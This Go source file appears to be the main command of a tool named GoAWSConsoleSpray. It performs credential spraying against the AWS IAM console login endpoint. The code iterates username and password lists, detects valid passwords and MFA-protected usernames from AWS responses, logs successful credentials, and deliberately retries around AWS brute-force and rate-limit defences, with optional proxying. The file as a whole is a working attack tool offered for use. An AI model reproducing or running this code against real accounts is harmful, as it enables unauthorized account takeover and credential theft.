// SPDX-License-Identifier: GPL-3.0-or-later
package cmd

import (
	"bufio"
	"encoding/json"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"time"
	"net/http"
	"net/url"

	"github.com/projectdiscovery/retryablehttp-go"
	"github.com/spf13/cobra"
)

// AWS Login Response JSON Structure as of 6/10/2022
type AwsLoginResponse struct {
	State		string `json:"state"`
	Properties	struct {
			Result			string	`json:"result"`
			RedirectURL		string	`json:"redirectUrl"`
			Text			string	`json:"text"`
			MFAType			string	`json:"mfaType"`
	} `json:"properties"`
}

// status codes enum for error handling
type ReturnStatus int64

const (
	SUCCESS		ReturnStatus = 0
	ACCOUNTMFA			= 1
	FAILED				= 2
	CONNFAIL			= 3
)

var (
		fUserfile		string
		fPassfile		string
		fAccountID		string
		fProxy			string
		fStopOnSuccess		bool
		fVerbose		bool
		fDelay			int

		signinURL = "https://signin.aws.amazon.com/authenticate"
		title = "GoAWSConsoleSpray" 

		rootCmd = &cobra.Command{
		Use:   title,
		Short: "A tool used to spray against AWS IAM Console Credentials",
		Long: `
	GoAWSConsoleSpray is used to spray AWS IAM console credentials from
	a list of usernames and passwords. The tool will detect valid usernames
	if those accounts are configured with MFA enabled. If no MFA, it will 
	detect successful login attempts. Accounts configured with MFA cannot
	be sprayed at this time.
	
	Example: GoAWSConsoleSpray -u users.txt -p pws.txt -a 123456789012`,

		Run: func(cmd *cobra.Command, args []string) {
			spray()
		 },
	}
)

func Execute() {
	err := rootCmd.Execute()
	if err != nil {
		os.Exit(1)
	}
}

func init() {
	rootCmd.Flags().StringVarP(&fAccountID,"accountID", "a", "", "AWS Account ID (required)")
	rootCmd.Flags().StringVarP(&fUserfile,"userfile", "u", "", "Username list (required)")
	rootCmd.Flags().StringVarP(&fPassfile,"passfile", "p", "", "Password list (required)")
	rootCmd.Flags().IntVarP(&fDelay,"delay", "d", 0, "Optional Time Delay Between Requests for rate limiting")
	rootCmd.Flags().StringVarP(&fProxy,"proxy", "x", "", "HTTP or Socks proxy URL & Port. Schema: proto://ip:port")
	rootCmd.Flags().BoolVarP(&fStopOnSuccess,"stopOnSuccess", "s", false, "Stop password spraying on successful hit")
	rootCmd.Flags().BoolVarP(&fVerbose,"verbose", "v", false, "Enable verbose logging")

	rootCmd.MarkFlagRequired("accountID")
	rootCmd.MarkFlagRequired("userfile")
	rootCmd.MarkFlagRequired("passfile")
}

func spray() {
	// Tweak these options as needed if spraying faster or for better network handling w/ retries
	// http client setup
	opts := retryablehttp.DefaultOptionsSingle
	opts.RetryMax = 0
	transport := retryablehttp.DefaultHostSprayingTransport()

	if fProxy != "" {
		proxyURL, parseErr := url.Parse(fProxy)
		if parseErr != nil {
			log.Printf("\t[!] ERROR:\tProxy schema error. \tMessage: %s",parseErr.Error())
			return
		}
		transport.Proxy = http.ProxyURL(proxyURL)
	}

	client := retryablehttp.NewWithHTTPClient(&http.Client{
		Transport:     transport,
	}, opts)

	var usernameList, passwordList []string

	// Open the files
	userfileHandle, err := os.Open(fUserfile)
	if err != nil{
		log.Printf("\t[!] ERROR:\tUserfile Failure. \tMessage: %s",err.Error())
		return
	}
	defer userfileHandle.Close()
	passfileHandle, err := os.Open(fPassfile)
	if err != nil{
		log.Printf("\t[!] ERROR:\tPassfile Failure. \tMessage: %s",err.Error())
		return
	}
	defer passfileHandle.Close()

	// Read username file
	scanner := bufio.NewScanner(userfileHandle)
	for scanner.Scan() {
		usernameList = append(usernameList, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		log.Printf("\t[!] ERROR:\tReading Userfile Failure. \tMessage: %s",err.Error())
		panic(err)
		return
	}

	// Read password file
	scanner = bufio.NewScanner(passfileHandle)
	for scanner.Scan() {
		passwordList = append(passwordList, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		log.Printf("\t[!] ERROR:\tReading Passfile Failure. \tMessage: %s",err.Error())
		panic(err)
		return
	}

	// Spraying Loop
	log.Printf("%s: [%d] users loaded. [%d] passwords loaded. [%d] potential login requests.",title,len(usernameList),len(passwordList),(len(usernameList) * len(passwordList)))
	loop: 
	for _, user := range usernameList {
		log.Printf("Spraying User: arn:aws:iam::%s:user/%s\n",fAccountID,user)
		for _, pass := range passwordList {
			check := attemptLogin(client,user,pass,fAccountID,fDelay,1)
			// connection failures and stop on succes
			if check == CONNFAIL || (fStopOnSuccess && check == SUCCESS){
				break loop
			}
			// skip the user if MFA is required, or a valid password was found
			if check == ACCOUNTMFA || check == SUCCESS{
				break
			}
		}
	}
}

func attemptLogin(client *retryablehttp.Client, username string, password string, accountID string, delay int, bfSleepRounds int) ReturnStatus{
	// check against empty strings from the file
	if len(username) < 1 || len(password) < 1{
		return FAILED
	}

	// add rate limiting
	if delay > 0 {
		time.Sleep(time.Duration(delay) * time.Second)
	}

	// post params
	params := url.Values{}
	params.Set("action","iam-user-authentication")
	params.Set("account",accountID)
	params.Set("username",username)
	params.Set("password",password)
	params.Set("client_id","arn:aws:signin:::console/canvas")
	params.Set("redirect_uri","https://console.aws.amazon.com")
	params.Set("rememberAccount","false")

	// send the request
	resp, err := client.PostForm(signinURL, params)

	// AWS on successful requests sets the response headers to >4kb, which breaks the HTTP Transport...
	// If this exception occurs, that means a valid password was observed as a bunch of long cookies are made.
	if err != nil {
		if strings.Contains(err.Error(), "server response headers exceeded") {
			log.Printf("(%s)\t[+] SUCCESS:\tValid Password: %s \tMFA: false\n",username,password)
			return SUCCESS
		} else {
			log.Printf("(%s)\t[!] ERROR:\tHTTP Stack Failure. \tMessage: %s",username,err.Error())
			return CONNFAIL
		}
	} else {
		defer resp.Body.Close()

		// check for bruteforce ratelimiting
		if resp.StatusCode == 429 {
			log.Printf("(%s)\t[!] WARNING:\tSending requests too quickly! Sleeping for 4 seconds to get around rate limiting...\n",username)
			time.Sleep(4 * time.Second)
			return attemptLogin(client,username,password,accountID,delay,1)
		}

		// Unmarshal the JSON response from AWS
		body, _ := ioutil.ReadAll(resp.Body)
		var loginResponse AwsLoginResponse
		if err2 := json.Unmarshal(body, &loginResponse); err2 != nil{
			log.Printf("(%s)\t[!] ERROR:\tUnmarshal JSON Failure. AWS probably changed JSON response structure. \tMessage: %s",username,err.Error())
			return FAILED
		}

		// Check for success and failure conditions
		if loginResponse.State == "SUCCESS" {
			if loginResponse.Properties.Result == "MFA"{
				log.Printf("(%s)\t[*] MFA:\tValid username detected. Account Requires MFA. Skipping this user.\n",username)
				return ACCOUNTMFA
			}
			log.Printf("(%s)\t[+] SUCCESS:\tValid Password: %s \tMFA: false\n",username,password)
			return SUCCESS
		} else {
			if strings.Contains(loginResponse.Properties.Text, "many invalid passwords have been used"){
				if fVerbose {
					log.Printf("(%s)\t[!] WARNING:\tAWS Account Bruteforce Ratelimit! Sleeping for %d seconds to get around this issue...\n", username,(5*bfSleepRounds))
				}
				time.Sleep(time.Duration(5 * bfSleepRounds) * time.Second)

				// increase the time delay since we have hit the bruteforce ratelimit check
				return attemptLogin(client,username,password,accountID,delay,(bfSleepRounds+1))
			}
			if fVerbose {
				log.Printf("(%s)\t[-] FAIL:\tInvalid Password: %s\n",username,password)
			}
			return FAILED
		}
	}
}